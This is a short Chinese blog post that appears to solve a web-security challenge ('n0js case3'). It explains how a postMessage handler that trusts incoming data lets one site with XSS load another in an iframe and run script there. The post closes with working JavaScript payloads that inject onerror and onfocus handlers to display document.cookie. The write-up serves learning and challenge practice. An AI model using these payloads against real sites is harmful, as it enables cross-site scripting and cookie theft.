Title: n0js case3
Date: 2017-1-7
Category: Fun
slug: n0js-case3

* <https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002>
* <http://server.n0tr00t.com/n0js/case3.php>
* <https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html>


在不同网页之间使用postMessage交流信息的时候，存在xss的情况，上面第二个链接是问题，第一个和第三个是对应的解决方法，最后的payload就是如下：

简单来说，如果A存在xss，B使用postMessage接收来自A的信息，那么在A站可以加载B的iframe，弹出B的cookie。所以这种情况下，A，B都是存在Xss漏洞的。

```
var t = document.createElement("iframe");
t.setAttribute("src","https://www.n0tr00t.com/static/test/helloevent.html");
//t.setAttribute("onload","frames[0].postMessage('<input onfocus=alert(document.cookie) autofocus>','*')");
document.body.appendChild(t);

function a(){
var b = document.createElement("button");
b.setAttribute("onclick","frames[0].postMessage('<img src=x onerror=alert(document.cookie)>','*')");
//b.setAttribute("onclick","frames[0].postMessage('this is onerror img src','*')");
document.body.appendChild(b);
b.click();
}
//setTimeout("a()",3000);
window.onload = a();

```